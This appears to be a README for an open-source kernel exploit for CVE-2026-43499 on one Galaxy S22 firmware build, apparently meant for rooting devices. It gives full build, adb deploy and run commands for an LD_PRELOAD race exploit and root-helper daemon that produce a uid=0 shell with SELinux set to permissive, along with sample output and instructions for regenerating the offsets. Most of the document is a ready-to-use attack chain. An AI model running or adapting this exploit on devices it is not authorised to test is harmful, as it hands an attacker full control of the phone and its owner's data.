# CVE-2026-43499 — Galaxy S22 (SM-S901B, S901BXXSNGZD7)

Device-specific IonStack CVE-2026-43499 payload for the Samsung Galaxy S22
Exynos (`r0s`) on firmware `S901BXXSNGZD7`. Gives volatile root
(`uid=0`, `u:r:kernel:s0`, SELinux `Permissive`) through an `LD_PRELOAD`
exploit + `call_usermodehelper` root-helper daemon. No boot image is
flashed; everything is gone after a reboot.

| Field | Value |
| --- | --- |
| Model | `SM-S901B` |
| Device | `r0s` |
| Firmware | `S901BXXSNGZD7` |
| Android | 16 / API 36 |
| Page size | 4096 |
| Kernel | `5.10.237-android12-9-31999025-abS901BXXSNGZD7` |
| SoC | Exynos 2200 (`s5e9925`) |
| Build fingerprint | `samsung/r0sxxx/essi:16/BP2A.250605.031.A3/S901BXXSNGZD7:user/release-keys` |
| Build display ID | `BP2A.250605.031.A3.S901BXXSNGZD7` |

Firmware provenance:

```text
boot.img size: 67108864
boot.img SHA-256: 74C8784753E1B9B3F239D85244FD3498948C20D89876B41F93759E22E6E96E50
kernel size: 34779648
kernel SHA-256: 3A5C445B896F9C23130A393569DBDFAFE0C9A15212788B7562FE00964435096C
ARM64 Image text_offset: 0x0
ARM64 Image size: 0x2410000
ARM64 Image flags: 0xa
Linux version 5.10.237-android12-9-31999025-abS901BXXSNGZD7 (dpi@21DODB17)
  (Android (7211189, based on r416183) clang version 12.0.4 (...), LLD 12.0.4 ...)
  #1 SMP PREEMPT Thu May 7 21:36:19 KST 2026
```

## Contents

```text
Makefile                          build (default PROJECT=S901BXXSNGZD7)
src/                              shared exploit source
src/targets/S901BXXSNGZD7/        target.h + exp32 stack geometry
target_generator/                 kallsyms/config/offset extractor scripts
artifacts/r0s-S901BXXSNGZD7/      app payload, helper, exp32 and SHA256SUMS
support/targets-v3.json           S22 Updater / Root My Galaxy-style feed entry
```

`src/targets/S901BXXSNGZD7/target.h` carries the firmware offsets used for
this build (`BUILD_VARIANT_LABEL "b0q_taro_v5.10"` heritage, see
`target_generator/` to re-derive them from a kernel `Image`).

`target_generator/` needs a Capstone install (`pip install capstone`) plus,
to regenerate from scratch, the S901B GZD7 kernel `Image` (34 MiB, not
shipped — SHA-256 above), then:

```sh
gcc -O2 kallsyms.c -o kallsyms
./kallsyms Image
./extract-ikconfig Image > config.txt
python3 generate_target.py kallsyms.txt config.txt Image --template target.h -o target.h
```

## Build

Set `ANDROID_NDK_HOME` to NDK r27+, plus `arm-linux-gnueabi-gcc` on `PATH`
for the 32-bit `exp32` stage (otherwise the NDK `armv7a` clang is used):

```sh
make clean preload root-helper
```

For a complete app/release bundle, use:

```sh
make clean release
```

Outputs:

```text
build/S901BXXSNGZD7/bin/cve-2026-43499       LD_PRELOAD payload
build/S901BXXSNGZD7/bin/cve-2026-43499-app.so app/feed payload (exp32 embedded)
build/S901BXXSNGZD7/bin/cve-2026-43499-root  root helper
build/S901BXXSNGZD7/bin/cve-exp32            32-bit stage (embedded)
artifacts/r0s-S901BXXSNGZD7/SHA256SUMS       release checksums
```

The app `.so` embeds the exp32 stage via `src/exp32_blob.S`, matching the
Root-My-Galaxy payload shape. The root helper remains a separate executable by
design; the app feed exposes it as `helper`, and the payload also honors
`CVE43499_ROOT_HELPER` if a caller stages it at another `/data/local/tmp` path.

## Deploy

```sh
adb push build/S901BXXSNGZD7/bin/cve-2026-43499 /data/local/tmp/cve-2026-43499
adb push build/S901BXXSNGZD7/bin/cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
adb push build/S901BXXSNGZD7/bin/cve-exp32 /data/local/tmp/cve-exp32
adb shell chmod 755 /data/local/tmp/cve-2026-43499 /data/local/tmp/cve-2026-43499-root /data/local/tmp/cve-exp32
```

Verify what's on the device before running:

```sh
adb shell "sha256sum /data/local/tmp/cve-2026-43499 /data/local/tmp/cve-exp32"
```

## Run

```sh
adb shell "EXPLOIT_ATTEMPTS=24 LD_PRELOAD=/data/local/tmp/cve-2026-43499 sh"
```

On success (`exploit completed attempt=N/24`), open the root shell:

```sh
adb shell "/data/local/tmp/cve-2026-43499-root -c 'id; getenforce'"
```

```text
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
Permissive
```

Root lives only in this boot through the helper daemon at
`/data/local/tmp/cve-2026-43499-root`. Plain `adb shell` stays
`uid=2000` by design — that is not a failure.

## Published artifacts

| Artifact | Bytes | SHA-256 |
| --- | ---: | --- |
| `artifacts/r0s-S901BXXSNGZD7/cve-2026-43499-app.so` | 1761728 | `290edd6f18b468030dcbe73e5b0541c7c3aa6a3ace8670d3aba1935179f99bd8` |
| `artifacts/r0s-S901BXXSNGZD7/cve-2026-43499` | 1761728 | `290edd6f18b468030dcbe73e5b0541c7c3aa6a3ace8670d3aba1935179f99bd8` |
| `artifacts/r0s-S901BXXSNGZD7/cve-2026-43499-root` | 13960 | `f28e778ac47a38826ccdfed8d49aaf40670a4af74ef10ac512414f844f9bdd6e` |
| `artifacts/r0s-S901BXXSNGZD7/cve-exp32` | 1645496 | `023190461719fc4cc11a7d114ff8da5132f1afa0eba32c907053e83682914152` |

The checked-in `support/targets-v3.json` includes the app payload SHA-256 and
the helper artifact SHA-256, so S22 Updater can fetch and verify both before it
runs the chain.

## Status / warnings

- Volatile root only: reboot removes root and the SELinux clear. Re-run
  the exploit every boot; nothing is flashed.
- The race stage is timing-sensitive: it can fail or panic the kernel.
  Reboot for clean slabs, close background apps, keep the screen unlocked
  and idle while it runs.
- Exact-build support for `SM-S901B` on `S901BXXSNGZD7` only. Other models,
  firmware, or kernel releases are not covered by these offsets.
- KernelSU module metadata is pinned in the feed for app-side verification.

## Credits

Based on the IonStack CVE-2026-43499 exploit implementation published in
[NebuSec/CyberMeowfia](https://github.com/NebuSec/CyberMeowfia) (upstream
revision `b850d3bddc74c3328d5fbcc0568d21962b55d949`) and
[BuSung-dev/CVE-2026-43499-S25U](https://github.com/BuSung-dev/CVE-2026-43499-S25U),
with thanks to [F-19-F/IonStackQuest3](https://github.com/F-19-F/IonStackQuest3).
Upstream Apache License 2.0 retained in [LICENSE](LICENSE). Use only on
devices you own or are explicitly authorized to test.
